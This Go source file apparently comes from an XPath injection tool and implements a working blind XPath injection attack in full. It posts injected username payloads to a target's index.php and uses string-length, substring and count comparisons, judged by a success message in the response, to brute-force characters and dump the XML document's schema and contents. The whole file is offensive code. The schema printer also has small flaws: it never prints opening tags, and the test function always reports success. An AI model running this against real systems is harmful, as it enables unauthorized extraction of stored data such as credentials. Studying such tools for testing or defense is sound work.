package exploit

import (
	"fmt"
	"strings"

	"github.com/letigredununavu/xpath-injection-tool/internal/httpclient"
)

func InjectionTest(target string, payload string) (bool, error) {
	raw_payload := fmt.Sprintf("invalid' or %s and '1'='1", payload)
	data := fmt.Sprintf("username=%s", raw_payload)
	target = target + "/index.php"
	contentType := "application/x-www-form-urlencoded"

	response, err := httpclient.SendPostRequest(target, data, contentType)

	if err != nil {
		return false, fmt.Errorf("[-] Error sending the request : %v", err)
	}

	successful := strings.Contains(response, "Message successfully sent!")

	return successful, nil
}

func GetLength(target string, subquery string, max_length int) (int, error) {
	for i := range max_length {
		payload := fmt.Sprintf("string-length(%s)=%d", subquery, i)
		fmt.Println(payload)
		sucess, _ := InjectionTest(target, payload)

		if sucess {
			return i, nil
		}
	}
	return 0, fmt.Errorf("[-] Error Getting length")
}

func GetData(target string, subquery string) (string, error) {
	length, err := GetLength(target, subquery, 50)
	alphabet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-:{}@!$"

	if err != nil {
		return "", fmt.Errorf("[-] Error : %v", err)
	}
	result := ""
	for i := range length {
		for _, char := range alphabet {
			payload := fmt.Sprintf("substring(%s,%d,1)='%c'", subquery, i+1, char)
			success, _ := InjectionTest(target, payload)
			if success {
				result += string(char)
				break
			}
		}
	}
	if result == "" {
		return "", fmt.Errorf("[-] Error getting data : No characters found")
	}
	return result, nil
}

func GetChildren(target string, subquery string, max_child int) (int, error) {
	for i := range max_child {
		fmt.Println(subquery)
		payload := fmt.Sprintf("count(%s)=%d", subquery, i)
		sucess, _ := InjectionTest(target, payload)

		if sucess {
			return i, nil
		}
	}
	return 0, fmt.Errorf("[-] Error getting children")
}

func GetSchema(target string, base_node string, depth int) {
	name, err := GetData(target, fmt.Sprintf("name(%s)", base_node))

	if err != nil {
		fmt.Println(fmt.Errorf("[-] Error exfiltrating schema : %v", err))
	}

	numberOfChildren, err := GetChildren(target, fmt.Sprintf("%s/*", base_node), 50)
	if err != nil {
		fmt.Println(fmt.Errorf("[-] Error : %v", err))
	}

	indent := ""
	for range depth {
		indent += " "
	}
	fmt.Println(indent)

	for i := range numberOfChildren {
		GetSchema(target, fmt.Sprintf("%s/*[%d]", base_node, i+1), depth+1)
	}

	if numberOfChildren == 0 {
		data, _ := GetData(target, base_node)

		indent = ""
		for range depth + 1 {
			indent += " "
		}
		indent += data
		fmt.Println(indent)
	}

	indent = ""
	for range depth {
		indent += " "
	}
	indent += fmt.Sprintf("</%s>", name)
	fmt.Println(indent)
}

func Test_BlindXPathInjection(target string) (bool, error) {

	GetSchema(target, "/*[1]", 0)

	return true, nil
}
